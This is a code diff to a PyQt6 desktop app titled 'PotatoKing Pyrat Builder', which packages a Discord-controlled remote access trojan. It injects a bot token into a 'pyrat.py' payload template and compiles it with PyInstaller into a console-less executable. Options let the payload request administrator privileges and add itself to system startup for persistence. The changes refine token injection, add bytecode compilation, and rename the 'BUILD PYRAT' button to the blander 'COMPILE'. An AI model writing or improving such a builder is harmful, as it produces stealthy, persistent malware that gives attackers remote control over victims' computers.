@@ -4,8 +4,9 @@ import subprocess
 import shutil
 import base64
 import re
-from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, 
-                             QFormLayout, QLabel, QLineEdit, QPushButton, QFileDialog, 
+import py_compile
+from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
+                             QFormLayout, QLabel, QLineEdit, QPushButton, QFileDialog,
                              QPlainTextEdit, QGroupBox, QColorDialog, QStatusBar, QCheckBox)
 from PyQt6.QtGui import QFont, QIcon, QColor, QPixmap, QCursor
 from PyQt6.QtCore import QObject, QThread, pyqtSignal, Qt
@@ -33,8 +34,10 @@ class Worker(QObject):
                 raise FileNotFoundError("The 'pyrat.py' template file was not found in the same directory.")
 
             self.log_message.emit("[*] Injecting configuration into payload...")
+
+            code_with_config = template_code.replace('"token"', f'"{self.config["token"]}"')
+            code_with_config = code_with_config.replace("'token'", f"'{self.config['token']}'")
             
-            code_with_config = template_code.replace("token", self.config["token"])
             code_with_config = code_with_config.replace("123456789012345678", self.config["category_id"])
             code_with_config = code_with_config.replace("'%ADD_TO_STARTUP%'", str(self.config['add_to_startup']))
 
@@ -50,8 +53,14 @@ class Worker(QObject):
                 f.write(code_with_config)
             self.log_message.emit("[+] Configuration & Theme injected successfully.")
 
+            self.log_message.emit(f"[*] Compiling '{build_file}' to bytecode...")
+            py_compile.compile(build_file, doraise=True)
+            self.log_message.emit("[+] Script compiled to bytecode successfully.")
+
             pyinstaller_cmd =[
-                'pyinstaller',
+                sys.executable,
+                '-m',
+                'PyInstaller',
                 '--noconfirm',
                 '--onefile',
                 '--noconsole',
@@ -61,11 +70,11 @@ class Worker(QObject):
             if self.config["icon_path"] and os.path.exists(self.config["icon_path"]):
                 pyinstaller_cmd.extend(['--icon', self.config["icon_path"]])
                 self.log_message.emit(f"[*] Added icon: {self.config['icon_path']}")
-                
+
             if self.config["require_admin"]:
                 pyinstaller_cmd.extend(['--uac-admin'])
                 self.log_message.emit("[*] Payload configured to request administrator privileges.")
-            
+
             pyinstaller_cmd.append(build_file)
 
             self.log_message.emit("[*] Compiling executable with PyInstaller... This may take a moment.")
@@ -78,15 +87,15 @@ class Worker(QObject):
 
             if process.returncode != 0:
                 raise Exception("PyInstaller compilation failed. Check the logs above for details.")
-            
+
             self.log_message.emit("[+] Executable compiled successfully!")
 
             self.log_message.emit("[*] Cleaning up temporary files...")
             dist_dir = os.path.join(os.getcwd(), 'dist')
             final_path = os.path.join(dist_dir, self.config['output_name'])
-            
+
             if not os.path.exists(final_path):
-                 final_path += ".exe" 
+                 final_path += ".exe"
                  if not os.path.exists(final_path):
                      raise FileNotFoundError(f"Could not find the compiled file in '{dist_dir}'.")
 
@@ -100,6 +109,7 @@ class Worker(QObject):
             spec_file = f"{os.path.splitext(self.config['output_name'])[0]}.spec"
             if os.path.exists(spec_file): os.remove(spec_file)
             if os.path.isdir("build"): shutil.rmtree("build")
+            if os.path.isdir("__pycache__"): shutil.rmtree("__pycache__")
             self.log_message.emit("[+] Cleanup complete.")
 
 
@@ -111,7 +121,7 @@ class PyratBuilderApp(QMainWindow):
         self.setWindowTitle("PotatoKing Pyrat Builder")
         self.setFixedSize(750, 900)
         self.setWindowFlags(self.windowFlags() & ~Qt.WindowType.WindowMaximizeButtonHint)
-        
+
         self.theme_color = QColor("#00FFFF")
 
         self.central_widget = QWidget()
@@ -120,7 +130,7 @@ class PyratBuilderApp(QMainWindow):
         self.main_layout = QVBoxLayout(self.central_widget)
         self.main_layout.setContentsMargins(30, 25, 30, 25)
         self.main_layout.setSpacing(18)
-        
+
         self.init_ui()
         self._update_theme_style()
         self._set_app_icon()
@@ -136,17 +146,17 @@ class PyratBuilderApp(QMainWindow):
         form_layout = QFormLayout(config_group)
         form_layout.setContentsMargins(20, 35, 20, 20)
         form_layout.setSpacing(15)
-        
+
         self.token_input = QLineEdit()
         self.token_input.setEchoMode(QLineEdit.EchoMode.Password)
         self.token_input.setPlaceholderText("Enter your Discord Bot Token")
-        
+
         self.category_id_input = QLineEdit()
         self.category_id_input.setPlaceholderText("e.g. 123456789012345678")
-        
+
         self.filename_input = QLineEdit("pyrat_payload")
         self.filename_input.setPlaceholderText("Output name without .exe")
-        
+
         form_layout.addRow(self._create_label("Discord Bot Token:"), self.token_input)
         form_layout.addRow(self._create_label("Category ID:"), self.category_id_input)
         form_layout.addRow(self._create_label("Output Filename:"), self.filename_input)
@@ -156,10 +166,10 @@ class PyratBuilderApp(QMainWindow):
         options_layout = QVBoxLayout(options_group)
         options_layout.setContentsMargins(20, 35, 20, 20)
         options_layout.setSpacing(12)
-        
+
         self.require_admin_checkbox = QCheckBox("Request administrator privileges on execution (--uac-admin)")
         self.add_to_startup_checkbox = QCheckBox("Add to system startup for persistence")
-        
+
         options_layout.addWidget(self.require_admin_checkbox)
         options_layout.addWidget(self.add_to_startup_checkbox)
         self.main_layout.addWidget(options_group)
@@ -168,26 +178,26 @@ class PyratBuilderApp(QMainWindow):
         custom_layout = QFormLayout(custom_group)
         custom_layout.setContentsMargins(20, 35, 20, 20)
         custom_layout.setSpacing(15)
-        
+
         self.icon_path_input = QLineEdit()
         self.icon_path_input.setPlaceholderText("Leave blank for default PyInstaller icon")
         browse_button = QPushButton("Browse...")
         browse_button.setCursor(QCursor(Qt.CursorShape.PointingHandCursor))
         browse_button.clicked.connect(self._browse_icon)
-        
+
         icon_layout = QHBoxLayout()
         icon_layout.addWidget(self.icon_path_input)
         icon_layout.addWidget(browse_button)
-        
+
         color_layout = QHBoxLayout()
         self.color_preview = QLabel()
         self.color_preview.setFixedSize(24, 24)
         self.color_preview.setStyleSheet(f"background-color: {self.theme_color.name()}; border-radius: 12px; border: 2px solid #23232e;")
-        
+
         self.color_button = QPushButton("Select Discord Theme Color")
         self.color_button.setCursor(QCursor(Qt.CursorShape.PointingHandCursor))
         self.color_button.clicked.connect(self._pick_color)
-        
+
         color_layout.addWidget(self.color_preview)
         color_layout.addWidget(self.color_button)
         color_layout.addStretch()
@@ -196,7 +206,7 @@ class PyratBuilderApp(QMainWindow):
         custom_layout.addRow(self._create_label("RAT Theme Color:"), color_layout)
         self.main_layout.addWidget(custom_group)
 
-        self.build_button = QPushButton("BUILD PYRAT")
+        self.build_button = QPushButton("COMPILE")
         self.build_button.setFont(QFont("Segoe UI", 16, QFont.Weight.Bold))
         self.build_button.setCursor(QCursor(Qt.CursorShape.PointingHandCursor))
         self.build_button.clicked.connect(self._start_build)
@@ -206,7 +216,7 @@ class PyratBuilderApp(QMainWindow):
         self.log_console.setReadOnly(True)
         self.log_console.setFont(QFont("Consolas", 10))
         self.main_layout.addWidget(self.log_console)
-        
+
         self.status_bar = QStatusBar()
         self.setStatusBar(self.status_bar)
         self.status_bar.showMessage("Ready to build. Fill out configuration.")
@@ -227,7 +237,7 @@ class PyratBuilderApp(QMainWindow):
     def _update_theme_style(self):
         color_hex = self.theme_color.name()
         darker_color = self.theme_color.darker(120).name()
-        
+
         style_sheet = f"""
             QMainWindow, #CentralWidget {{
                 background-color: #0d0d12;
@@ -333,7 +343,7 @@ class PyratBuilderApp(QMainWindow):
         self.build_button.setObjectName("BuildButton")
         self.setStyleSheet(style_sheet)
         self.color_preview.setStyleSheet(f"background-color: {color_hex}; border-radius: 12px; border: 2px solid #23232e;")
-    
+
     def _pick_color(self):
         color = QColorDialog.getColor(self.theme_color, self)
         if color.isValid():
@@ -347,7 +357,7 @@ class PyratBuilderApp(QMainWindow):
 
     def _log(self, message):
         self.log_console.appendPlainText(message)
-    
+
     def _toggle_controls(self, enabled):
         self.token_input.setEnabled(enabled)
         self.category_id_input.setEnabled(enabled)
@@ -357,7 +367,7 @@ class PyratBuilderApp(QMainWindow):
         self.require_admin_checkbox.setEnabled(enabled)
         self.add_to_startup_checkbox.setEnabled(enabled)
         self.build_button.setEnabled(enabled)
-        self.build_button.setText("BUILD PYRAT" if enabled else "BUILDING...")
+        self.build_button.setText("COMPILE" if enabled else "COMPILING...")
 
     def _start_build(self):
         self._toggle_controls(False)
@@ -384,7 +394,7 @@ class PyratBuilderApp(QMainWindow):
         self.worker.build_finished.connect(self.thread.quit)
         self.worker.build_finished.connect(self.worker.deleteLater)
         self.thread.finished.connect(self.thread.deleteLater)
-        
+
         self.thread.start()
 
     def _on_build_finished(self, success, message):
